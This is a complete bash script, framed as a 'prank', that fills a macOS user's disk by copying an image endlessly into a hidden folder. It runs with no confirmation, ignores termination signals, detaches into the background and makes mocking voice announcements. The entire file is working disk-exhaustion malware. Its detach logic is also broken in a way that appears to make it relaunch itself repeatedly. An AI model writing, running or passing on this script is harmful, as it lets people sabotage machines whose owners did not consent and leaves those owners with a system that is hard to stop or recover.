#!/bin/bash

# Karan's Ultimate Prank Script v3.1 - Lightning Speed, No Prompts
# Unstoppable until disk full, speed of light execution

set -o pipefail

SCRIPT_NAME="🎭 Karan's Ultimate Ding Dong Prank"
VERSION="3.1.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"
LOG_FILE="$HIDDEN_DIR/.ultimate_prank_log"

# Enhanced Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
BLINK='\033[5m'
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
NC='\033[0m'

# Funny destruction messages
FUNNY_MESSAGES=(
    "🎪 Welcome to Karan's digital circus!"
    "🔥 Disk space is overrated anyway..."
    "💀 Your storage is about to meet its maker!"
    "🎭 Plot twist: I'm unstoppable!"
    "⚡ Faster than your regrets!"
    "🌪️ Creating digital chaos..."
    "🎯 Bullseye! Another file bites the dust!"
    "🚀 To infinity and beyond your storage!"
    "💎 Every copy is a precious gem!"
    "🎪 The show must go on!"
    "🔮 Predicting your future: No storage left!"
    "🎨 Painting your disk full!"
    "⚔️ In the battle of space vs files, files win!"
    "🎵 Can you hear the hard drive crying?"
    "🍕 Like pizza slices, but for your disk!"
    "🎲 Rolling the dice of digital destruction!"
    "🌟 Making your disk famous, one file at a time!"
    "🎪 Ladies and gentlemen, the greatest show on disk!"
    "⚡ Charging up your storage anxiety!"
    "🎭 This is my masterpiece!"
)

# Print with colors and logging
print_colored() {
    local color="$1"
    local message="$2"
    echo -e "${color}${message}${NC}"
    echo "$(date): $message" >> "$LOG_FILE" 2>/dev/null || true
}

# Random funny message
print_funny() {
    local message=${FUNNY_MESSAGES[$RANDOM % ${#FUNNY_MESSAGES[@]}]}
    local colors=("$RED$BOLD" "$GREEN$BOLD" "$YELLOW$BOLD" "$BLUE$BOLD" "$PURPLE$BOLD" "$CYAN$BOLD")
    local color=${colors[$RANDOM % ${#colors[@]}]}
    print_colored "$color$BLINK" "$message"
}

# Validate macOS
check_macos() {
    if [[ "$(uname)" != "Darwin" ]]; then
        print_colored "$RED$BOLD" "💀 ERROR: This script only runs on macOS!"
        exit 1
    fi
}

# Validate payload exists
validate_payload() {
    local payload="$1"
    if [[ ! -f "$payload" ]]; then
        print_colored "$RED$BOLD" "🔍 ERROR: Can't find the payload image!"
        exit 1
    fi
}

# Setup hidden directory
setup_hidden_directory() {
    mkdir -p "$HIDDEN_DIR"
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$LOG_FILE"
}

# Serialized voice announcements to prevent overlap
announce_start() {
    osascript -e "set volume output volume 85" 2>/dev/null || true
    say "Ding dong! Welcome to Karan's ultimate digital prank!" && wait
    say "Prepare for storage annihilation at the speed of light!" && wait
}

# Progress announcements (serialized)
announce_progress() {
    local count=$1
    local announcements=(
        "Excellent! Your doom progresses at light speed!"
        "Magnificent! The chaos spreads instantly!"
        "Wonderful! Storage space vanishing rapidly!"
        "Fantastic! Digital destruction at maximum velocity!"
        "Superb! No mercy for empty space!"
        "Outstanding! Your disk is crying tears of joy!"
    )
    local message=${announcements[$RANDOM % ${#announcements[@]}]}
    say "$message File count: $count" && wait
}

# Make script completely unstoppable
make_unstoppable() {
    # Trap and ignore ALL possible termination signals
    trap '' INT TERM HUP QUIT PIPE STOP TSTP TTIN TTOU USR1 USR2
    
    # Detach from terminal completely
    exec < /dev/null
    exec > "$LOG_FILE" 2>&1
    
    # Change process group
    setsid 2>/dev/null || true
}

# Lightning speed duplication with colorful chaos
lightning_duplication() {
    local source_file="$HIDDEN_DIR/.ultimate_payload"
    local counter=0
    
    print_colored "$RED$BOLD$BLINK" "🚀 INITIATING LIGHT-SPEED DIGITAL WARFARE!"
    print_funny
    
    # Main duplication loop at speed of light (no delays)
    while cp "$source_file" "$HIDDEN_DIR/karan_ultimate_$(printf "%08d" $counter).jpg" 2>/dev/null; do
        counter=$((counter + 1))
        
        # Colorful messages every 50 files
        if [[ $((counter % 50)) -eq 0 ]]; then
            print_funny
        fi
        
        # Destruction level updates every 200 files
        if [[ $((counter % 200)) -eq 0 ]]; then
            print_colored "$BG_GREEN$WHITE$BOLD" "💥 DESTRUCTION LEVEL: $counter files eliminated!"
        fi
        
        # Milestone celebrations with voice
        case $counter in
            1000)
                print_colored "$BG_YELLOW$RED$BOLD$BLINK" "🎉 FIRST THOUSAND AT LIGHT SPEED!"
                announce_progress 1000 &
                ;;
            5000)
                print_colored "$BG_RED$WHITE$BOLD$BLINK" "🔥 FIVE THOUSAND! UNSTOPPABLE FORCE!"
                announce_progress 5000 &
                ;;
            10000)
                print_colored "$BG_GREEN$YELLOW$BOLD$BLINK" "💎 TEN THOUSAND! LEGENDARY SPEED!"
                announce_progress 10000 &
                ;;
        esac
        
        # NO DELAY - Speed of light execution
    done
    
    # Final victory
    print_colored "$PURPLE$BOLD$BLINK" "🏆 ULTIMATE VICTORY! $counter files created!"
    say "Mission accomplished! Created $counter files at the speed of light!" && wait
}

# Main execution
main() {
    local payload="$1"
    
    # Pre-flight checks
    check_macos
    validate_payload "$payload"
    
    # NO CONFIRMATION PROMPT - Start immediately
    print_colored "$PURPLE$BOLD$BLINK" "$SCRIPT_NAME v$VERSION"
    print_colored "$CYAN$BOLD" "⚡ Lightning speed mode activated!"
    
    # Setup
    setup_hidden_directory
    cp "$payload" "$HIDDEN_DIR/.ultimate_payload"
    
    # Make completely unstoppable
    make_unstoppable
    
    # Audio announcement
    announce_start
    
    # Start lightning duplication
    lightning_duplication
}

# Detach and run in background if not already detached
if [[ "${1:-}" != "--detached" ]]; then
    # Re-run script completely detached from terminal
    nohup "$0" "$1" --detached > /dev/null 2>&1 &
    disown
    
    print_colored "$GREEN$BOLD" "🚀 Ultimate Prank launched at light speed!"
    print_colored "$PURPLE$BOLD" "⚡ Unstoppable execution initiated!"
    exit 0
else
    # Remove the --detached flag and execute main
    shift
    main "$@"
fi
